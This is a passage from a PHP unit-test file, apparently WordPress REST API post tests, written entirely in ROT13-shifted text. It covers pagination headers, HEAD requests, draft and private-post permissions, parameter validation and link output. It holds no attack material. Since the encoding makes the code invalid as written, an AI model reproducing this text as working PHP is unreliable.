			erfg_hey( '/jc/i2/cbfgf' )
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// 3eq cntr.
		frys::snpgbel()->cbfg->perngr();
		++$gbgny_cbfgf;
		++$gbgny_cntrf;
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cntr', 3 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_cbfgf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
			erfg_hey( '/jc/i2/cbfgf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 4,
			),
			erfg_hey( '/jc/i2/cbfgf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// Ynfg cntr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cntr', $gbgny_cntrf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_cbfgf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => $gbgny_cntrf - 1,
			),
			erfg_hey( '/jc/i2/cbfgf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"arkg\"', $urnqref['Yvax'] );

		// Bhg bs obhaqf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cntr', 100 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cntr_ahzore', $erfcbafr, 400 );

		// Jvgu dhrel cnenzf.
		$gbgny_cntrf = (vag) prvy( $gbgny_cbfgf / 5 );
		$erdhrfg     = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'cre_cntr' => 5,
				'cntr'     => 2,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_cbfgf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cre_cntr' => 5,
				'cntr'     => 1,
			),
			erfg_hey( '/jc/i2/cbfgf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cre_cntr' => 5,
				'cntr'     => 3,
			),
			erfg_hey( '/jc/i2/cbfgf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_bayl_srgpurf_vqf_sbe_urnq_erdhrfgf( $zrgubq ) {
		$vf_urnq_erdhrfg = 'URNQ' === $zrgubq;
		$erdhrfg         = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );

		$svygre = arj ZbpxNpgvba();

		nqq_svygre( 'cbfgf_cer_dhrel', neenl( $svygre, 'svygre' ), 10, 2 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		vs ( $vf_urnq_erdhrfg ) {
			$guvf->nffregRzcgl( $erfcbafr->trg_qngn() );
		} ryfr {
			$guvf->nffregAbgRzcgl( $erfcbafr->trg_qngn() );
		}

		$netf = $svygre->trg_netf();
		$guvf->nffregGehr( vffrg( $netf[0][1] ), 'Dhrel cnenzrgref jrer abg pncgherq.' );
		$guvf->nffregVafgnaprBs( JC_Dhrel::pynff, $netf[0][1], 'Dhrel cnenzrgref jrer abg pncgherq.' );

		/** @ine JC_Dhrel $dhrel */
		$dhrel = $netf[0][1];

		vs ( $vf_urnq_erdhrfg ) {
			$guvf->nffregNeenlUnfXrl( 'svryqf', $dhrel->dhrel, 'Gur svryqf cnenzrgre vf abg frg va gur dhrel inef.' );
			$guvf->nffregFnzr( 'vqf', $dhrel->dhrel['svryqf'], 'Gur dhrel zhfg srgpu bayl cbfg VQf.' );
			$guvf->nffregNeenlUnfXrl( 'svryqf', $dhrel->dhrel_inef, 'Gur svryqf cnenzrgre vf abg frg va gur dhrel inef.' );
			$guvf->nffregFnzr( 'vqf', $dhrel->dhrel_inef['svryqf'], 'Gur dhrel zhfg srgpu bayl cbfg VQf.' );
			$guvf->nffregNeenlUnfXrl( 'hcqngr_cbfg_grez_pnpur', $dhrel->dhrel_inef, 'Gur \"hcqngr_cbfg_grez_pnpur\" cnenzrgre vf zvffvat va gur dhrel inef.' );
			$guvf->nffregSnyfr( $dhrel->dhrel_inef['hcqngr_cbfg_grez_pnpur'], 'Gur \"hcqngr_cbfg_grez_pnpur\" cnenzrgre zhfg or snyfr sbe URNQ erdhrfgf.' );
			$guvf->nffregNeenlUnfXrl( 'hcqngr_cbfg_zrgn_pnpur', $dhrel->dhrel_inef, 'Gur \"hcqngr_cbfg_zrgn_pnpur\" cnenzrgre vf zvffvat va gur dhrel inef.' );
			$guvf->nffregSnyfr( $dhrel->dhrel_inef['hcqngr_cbfg_zrgn_pnpur'], 'Gur \"hcqngr_cbfg_zrgn_pnpur\" cnenzrgre zhfg or snyfr sbe URNQ erdhrfgf.' );
		} ryfr {
			$guvf->nffregGehr( ! neenl_xrl_rkvfgf( 'svryqf', $dhrel->dhrel ) || 'vqf' !== $dhrel->dhrel['svryqf'], 'Gur svryqf cnenzrgre fubhyq abg or sbeprq gb \"vqf\" sbe aba-URNQ erdhrfgf.' );
			$guvf->nffregGehr( ! neenl_xrl_rkvfgf( 'svryqf', $dhrel->dhrel_inef ) || 'vqf' !== $dhrel->dhrel_inef['svryqf'], 'Gur svryqf cnenzrgre fubhyq abg or sbeprq gb \"vqf\" sbe aba-URNQ erdhrfgf.' );
			$guvf->nffregNeenlUnfXrl( 'hcqngr_cbfg_grez_pnpur', $dhrel->dhrel_inef, 'Gur \"hcqngr_cbfg_grez_pnpur\" cnenzrgre vf zvffvat va gur dhrel inef.' );
			$guvf->nffregGehr( $dhrel->dhrel_inef['hcqngr_cbfg_grez_pnpur'], 'Gur \"hcqngr_cbfg_grez_pnpur\" cnenzrgre zhfg or gehr sbe aba-URNQ erdhrfgf.' );
			$guvf->nffregNeenlUnfXrl( 'hcqngr_cbfg_zrgn_pnpur', $dhrel->dhrel_inef, 'Gur \"hcqngr_cbfg_zrgn_pnpur\" cnenzrgre vf zvffvat va gur dhrel inef.' );
			$guvf->nffregGehr( $dhrel->dhrel_inef['hcqngr_cbfg_zrgn_pnpur'], 'Gur \"hcqngr_cbfg_zrgn_pnpur\" cnenzrgre zhfg or gehr sbe aba-URNQ erdhrfgf.' );
		}

		vs ( ! $vf_urnq_erdhrfg ) {
			erghea;
		}

		tybony $jcqo;
		$cbfgf_gnoyr = cert_dhbgr( $jcqo->cbfgf, '/' );
		$cnggrea     = '/^FRYRPG\f+FDY_PNYP_SBHAQ_EBJF\f+' . $cbfgf_gnoyr . '\.VQ\f+SEBZ\f+' . $cbfgf_gnoyr . '\f+JURER/v';

		// Nffreg gung gur FDY dhrel bayl srgpurf gur VQ pbyhza.
		$guvf->nffregZngpurfErthyneRkcerffvba( $cnggrea, $dhrel->erdhrfg, 'Gur FDY dhrel qbrf abg zngpu gur rkcrpgrq fgevat.' );
	}

	choyvp shapgvba grfg_trg_vgrzf_fgnghf_qensg_crezvffvbaf() {
		$qensg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'qensg' ) );

		// Qensgf fgnghf dhrel ine vanpprffvoyr gb hanhgubevmrq hfref.
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgnghf', 'qensg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		// Hfref jvgu 'ernq_cevingr_cbfgf' pnc fubhyqa'g nyfb or noyr gb ivrj qensgf.
		jc_frg_pheerag_hfre( frys::$cevingr_ernqre_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgnghf', 'qensg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		// Ohg qensgf ner npprffvoyr gb nhgubevmrq hfref.
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $qensg_vq, $qngn[0]['vq'] );
	}

	/**
	 * @gvpxrg 43701
	 */
	choyvp shapgvba grfg_trg_vgrzf_fgnghf_cevingr_crezvffvbaf() {
		$cevingr_cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'cevingr' ) );

		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgnghf', 'cevingr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		jc_frg_pheerag_hfre( frys::$cevingr_ernqre_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgnghf', 'cevingr' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $cevingr_cbfg_vq, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_cre_cntr() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'cre_cntr' => -1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 39061
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_znk_cntrf() {
		// Bhg bs obhaqf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cntr', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cntr_ahzore', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_pbagrkg() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'onanan' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_qngr() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'nsgre', 'sbb' );
		$erdhrfg->frg_cnenz( 'orsber', 'one' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_inyvq_qngr() {
		$cbfg1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2016-01-15G00:00:00M' ) );
		$cbfg2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2016-01-16G00:00:00M' ) );
		$cbfg3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2016-01-17G00:00:00M' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'nsgre', '2016-01-15G00:00:00M' );
		$erdhrfg->frg_cnenz( 'orsber', '2016-01-17G00:00:00M' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $cbfg2, $qngn[0]['vq'] );
	}

	/**
	 * @gvpxrg 50617
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_zbqvsvrq_qngr() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'zbqvsvrq_nsgre', 'sbb' );
		$erdhrfg->frg_cnenz( 'zbqvsvrq_orsber', 'one' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 50617
	 */
	choyvp shapgvba grfg_trg_vgrzf_inyvq_zbqvsvrq_qngr() {
		$cbfg1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2016-01-01 00:00:00' ) );
		$cbfg2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2016-01-02 00:00:00' ) );
		$cbfg3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2016-01-03 00:00:00' ) );
		$guvf->hcqngr_cbfg_zbqvsvrq( $cbfg1, '2016-01-15 00:00:00' );
		$guvf->hcqngr_cbfg_zbqvsvrq( $cbfg2, '2016-01-16 00:00:00' );
		$guvf->hcqngr_cbfg_zbqvsvrq( $cbfg3, '2016-01-17 00:00:00' );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'zbqvsvrq_nsgre', '2016-01-15G00:00:00M' );
		$erdhrfg->frg_cnenz( 'zbqvsvrq_orsber', '2016-01-17G00:00:00M' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $cbfg2, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_nyy_cbfg_sbezngf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$sbezngf = neenl_inyhrf( trg_cbfg_sbezng_fyhtf() );

		$guvf->nffregFnzr( $sbezngf, $qngn['fpurzn']['cebcregvrf']['sbezng']['rahz'] );
	}

	choyvp shapgvba grfg_trg_vgrz() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_cbfg_erfcbafr( $erfcbafr, 'ivrj' );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );

		$ubbx_anzr = 'erfg_cercner_' . trg_cbfg_glcr( frys::$cbfg_vq );
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf abg pnyyrq jura vg fubhyq or sbe TRG/URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'Yvax', $urnqref, 'Gur \"Yvax\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', fcevags( $cngu, frys::$cbfg_vq ) );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/cbfgf/%q' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/cbfgf' ),
		);
	}

	choyvp shapgvba grfg_trg_vgrz_yvaxf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$yvaxf = $erfcbafr->trg_yvaxf();

		$guvf->nffregFnzr( erfg_hey( '/jc/i2/cbfgf/' . frys::$cbfg_vq ), $yvaxf['frys'][0]['uers'] );
		$guvf->nffregFnzr( erfg_hey( '/jc/i2/cbfgf' ), $yvaxf['pbyyrpgvba'][0]['uers'] );
		$guvf->nffregNeenlAbgUnfXrl( 'rzorqqnoyr', $yvaxf['frys'][0]['nggevohgrf'] );

		$guvf->nffregFnzr( erfg_hey( '/jc/i2/glcrf/' . trg_cbfg_glcr( frys::$cbfg_vq ) ), $yvaxf['nobhg'][0]['uers'] );

		$ercyvrf_hey = erfg_hey( '/jc/i2/pbzzragf' );
		$ercyvrf_hey = nqq_dhrel_net( 'cbfg', frys::$cbfg_vq, $ercyvrf_hey );
		$guvf->nffregFnzr( $ercyvrf_hey, $yvaxf['ercyvrf'][0]['uers'] );

		$guvf->nffregFnzr( erfg_hey( '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' ), $yvaxf['irefvba-uvfgbel'][0]['uers'] );
		$guvf->nffregFnzr( 0, $yvaxf['irefvba-uvfgbel'][0]['nggevohgrf']['pbhag'] );
		$guvf->nffregNeenlAbgUnfXrl( 'cerqrprffbe-irefvba', $yvaxf );

		$nggnpuzragf_hey = erfg_hey( '/jc/i2/zrqvn' );
		$nggnpuzragf_hey = nqq_dhrel_net( 'cnerag', frys::$cbfg_vq, $nggnpuzragf_hey );
		$guvf->nffregFnzr( $nggnpuzragf_hey, $yvaxf['uggcf://ncv.j.bet/nggnpuzrag'][0]['uers'] );

		$grez_yvaxf  = $yvaxf['uggcf://ncv.j.bet/grez'];
		$gnt_yvax    = ahyy;
		$png_yvax    = ahyy;
		$sbezng_yvax = ahyy;
		sbernpu ( $grez_yvaxf nf $yvax ) {
			vs ( 'cbfg_gnt' === $yvax['nggevohgrf']['gnkbabzl'] ) {
				$gnt_yvax = $yvax;
			} ryfrvs ( 'pngrtbel' === $yvax['nggevohgrf']['gnkbabzl'] ) {
				$png_yvax = $yvax;
			} ryfrvs ( 'cbfg_sbezng' === $yvax['nggevohgrf']['gnkbabzl'] ) {
				$sbezng_yvax = $yvax;
			}
		}
		$guvf->nffregAbgRzcgl( $gnt_yvax );
		$guvf->nffregAbgRzcgl( $png_yvax );
		$guvf->nffregAhyy( $sbezng_yvax );

		$gntf_hey = nqq_dhrel_net( 'cbfg', frys::$cbfg_vq, erfg_hey( '/jc/i2/gntf' ) );
		$guvf->nffregFnzr( $gntf_hey, $gnt_yvax['uers'] );

		$pngrtbel_hey = nqq_dhrel_net( 'cbfg', frys::$cbfg_vq, erfg_hey( '/jc/i2/pngrtbevrf' ) );
		$guvf->nffregFnzr( $pngrtbel_hey, $png_yvax['uers'] );
	}

	choyvp shapgvba grfg_trg_vgrz_yvaxf_cerqrprffbe() {
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf zneirybhf.',
				'VQ'           => frys::$cbfg_vq,
			)
		);
		$erivfvbaf  = jc_trg_cbfg_erivfvbaf( frys::$cbfg_vq );
		$erivfvba_1 = neenl_cbc( $erivfvbaf );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$yvaxf = $erfcbafr->trg_yvaxf();

		$guvf->nffregFnzr( erfg_hey( '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' ), $yvaxf['irefvba-uvfgbel'][0]['uers'] );
		$guvf->nffregFnzr( 1, $yvaxf['irefvba-uvfgbel'][0]['nggevohgrf']['pbhag'] );

		$guvf->nffregFnzr( erfg_hey( '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $erivfvba_1->VQ ), $yvaxf['cerqrprffbe-irefvba'][0]['uers'] );
		$guvf->nffregFnzr( $erivfvba_1->VQ, $yvaxf['cerqrprffbe-irefvba'][0]['nggevohgrf']['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrz_yvaxf_ab_nhgube() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();
		$guvf->nffregNeenlAbgUnfXrl( 'nhgube', $yvaxf );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => frys::$cbfg_vq,
				'cbfg_nhgube' => frys::$nhgube_vq,
			)
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();
		$guvf->nffregFnzr( erfg_hey( '/jc/i2/hfref/' . frys::$nhgube_vq ), $yvaxf['nhgube'][0]['uers'] );
	}

	choyvp shapgvba grfg_trg_cbfg_qensg_fgnghf_abg_nhguragvpngrq() {
		$qensg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'qensg',
			)
		);

		jc_frg_pheerag_hfre( 0 );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $qensg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra', $erfcbafr, 401 );
	}

	/**
	 * Grfgf gung nhguragvpngrq hfref ner bayl nyybjrq gb ernq cnffjbeq cebgrpgrq pbagrag
	 * vs gurl unir gur 'rqvg_cbfg' zrgn pncnovyvgl sbe gur cbfg.
	 */
	choyvp shapgvba grfg_trg_cbfg_qensg_rqvg_pbagrkg() {
		$cbfg_pbagrag = 'Uryyb Jbeyq!';

		// Perngr n cnffjbeq cebgrpgrq cbfg nf na Rqvgbe.
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'    => 'Ubyn',
				'cbfg_cnffjbeq' => 'cnffjbeq',
				'cbfg_pbagrag'  => $cbfg_pbagrag,
				'cbfg_rkprecg'  => $cbfg_pbagrag,
				'cbfg_nhgube'   => frys::$rqvgbe_vq,
			)
		);

		// Perngr n qensg jvgu gur Yngrfg Cbfgf oybpx nf n Pbagevohgbe.
		$qensg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_nhgube'  => frys::$pbagevohgbe_vq,
				'cbfg_pbagrag' => '<!-- jc:yngrfg-cbfgf {\"qvfcynlCbfgPbagrag\":gehr} /--> <!-- jc:yngrfg-cbfgf {\"qvfcynlCbfgPbagrag\":gehr,\"qvfcynlCbfgPbagragEnqvb\":\"shyy_cbfg\"} /-->',
			)
		);

		// Frg gur pheerag hfre gb Pbagevohgbe naq erdhrfg gur qensg sbe rqvgvat.
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $qensg_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		/*
		 * Irevsl gung gur pbagrag bs n cnffjbeq cebgrpgrq cbfg perngrq ol na Rqvgbe
		 * vf abg ivrjnoyr ol n Pbagevohgbe.
		 */
		$guvf->nffregFgevatAbgPbagnvafFgevat( $cbfg_pbagrag, $qngn['pbagrag']['eraqrerq'] );
	}

	choyvp shapgvba grfg_trg_cbfg_vainyvq_vq() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
